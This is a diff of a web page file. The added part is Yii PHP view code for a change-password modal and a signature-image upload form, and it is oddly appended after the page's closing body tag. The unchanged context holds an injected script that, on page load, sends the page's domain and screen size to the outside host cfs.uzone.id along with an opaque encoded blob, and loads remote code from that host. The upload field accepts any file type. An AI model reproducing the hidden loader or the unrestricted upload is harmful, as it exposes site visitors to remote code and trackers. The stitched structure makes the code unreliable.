@@ -398,4 +398,72 @@ function openNav() {
 
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnCv7lBzaUwewgzuJAgHyQslbfzyOBV59G4uv6hkR%2ffS07xdHl%2fcmbLIQfORW%2b39RkF8AO%2bt9r6syAkNj%2b%2bvvziUlvsW6Psd7jnsfXsk4%2fLFigqB1PHDUG5hp9tXpBYPNTEhnBv7WuYF0l0paOJ8BcWOeo7467YHpq9E00JeeMGKtfY67X%2bkYw4u6Vs6s%2fqcrgiIVrKDdm97LEFSWB1Lc0BTUDHNhaeYqduREIRXB9yG%2bpGJQ9LdeOHRSgqBD4au4AduDTl6Lp9TeOWDukiX4pyU%2fIuMt%2fTito%2fcunlmxBW5i5ax%2bJqCruns8Ji8BSoz5rORzKd0yFVqwuQrMvh5dT7e4z0Tw%2fHAY%2b6xpiS30oVuvT7JEqdHqFCO0Eh4%2bq92yDSgmMWtE5BsHpeu%2bAQI9knQYpf8Hp8j1cnmOfYgqO%2f%2fqZtQAd4n2J6Ox7NyvCBJHQBk7ZeQQk8BhEuQhjvZ6knBikWnWxR3djNahYQ4Wo13CP4LKc%2f3RKT9d0F8ziWgkWk2pOIKyzNnadh9NS4QZMbG4U3tGU2huJ1I%2fABgoUmtZxy%2bog%2fmaTXKTz2s9O3gdr6x9%2bMI5VE7o%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
+<?php
+	/*
+	 * CHANGE PASSWORD UTAMA
+	 * @author ptrnov <piter@lukison.com>
+	 * @since 1.2
+	*/
+	$this->registerJs("
+			$.fn.modal.Constructor.prototype.enforceFocus = function() {};
+			$('#profile-password').on('show.bs.modal', function (event) {
+				var button = $(event.relatedTarget)
+				var modal = $(this)
+				var title = button.data('title')
+				var href = button.attr('href')
+				modal.find('.modal-title').html(title)
+				modal.find('.modal-body').html('<i class=\"fa fa-spinner fa-spin\"></i>')
+				$.post(href)
+					.done(function( data ) {
+						modal.find('.modal-body').html(data)
+					});
+				}),
+	",$this::POS_READY);
+	Modal::begin([
+			'id' => 'profile-password',
+			'header' => '<div style="float:left;margin-right:10px">'. Html::img('@web/img_setting/login/login1.png',  ['class' => 'pnjg', 'style'=>'width:100px;height:70px;']).'</div><div style="margin-top:10px;"><h4><b>Change Password Login</b></h4></div>',
+			// 'size' => Modal::SIZE_MIDLE,
+			'headerOptions'=>[
+				'style'=> 'border-radius:5px; background-color:rgba(230, 251, 225, 1)'
+			]
+		]);
+	Modal::end();
 
+	/*
+	 * MODAL INPUT FILE Signature
+	 * @author piter [ptr.nov@gmail.com]
+	 * @since 1.2
+	*/
+	Modal::begin([
+		'id' => 'signature-import-image',
+		'header' => '<div style="float:left;margin-right:10px">'.
+						Html::img('@web/img_setting/warning/upload1.png',
+						['class' => 'pnjg', 'style'=>'width:40px;height:40px;'])
+					.'</div><div style="margin-top:10px;"><h4><b>Upload path of Signature Image!</b></h4></div>',
+		//'size' => Modal::SIZE_SMALL,
+		'headerOptions'=>[
+			'style'=> 'border-radius:5px; background-color:rgba(142, 202, 223, 0.9)'
+		]
+	]);
+		$form = ActiveForm::begin([
+			'id'=>'signature-import-image',
+			'options'=>['enctype'=>'multipart/form-data'], // important,
+			'method' => 'post',
+			'action' => ['/sistem/user-profile/upload-signature-file'],
+		]);
+			echo $form->field($modelUpload, 'uploadDataFile')->widget(FileInput::classname(), [
+				'options' => ['accept' => '*'],
+				/* 'pluginOptions' => [
+					'uploadUrl' => Url::to(['/sales/import-data/upload']),
+				] */
+			]);
+			// echo $form->field($modelUpload, 'FILE_PATH')->hiddenInput(['value' => 'signature'])->label(false);
+			echo '<div style="text-align:right; padding-top:10px">';
+			echo Html::submitButton('Upload',['class' => 'btn btn-success']);
+			echo '</div>';
+			//echo Html::submitButton($modelUpload->isNewRecord ? 'simpan_' : 'SAVED', ['class' => $modelUpload->isNewRecord ? 'btn btn-success' : 'btn btn-primary','title'=>'Detail']);
+
+		ActiveForm::end();
+	Modal::end();
+
+?>
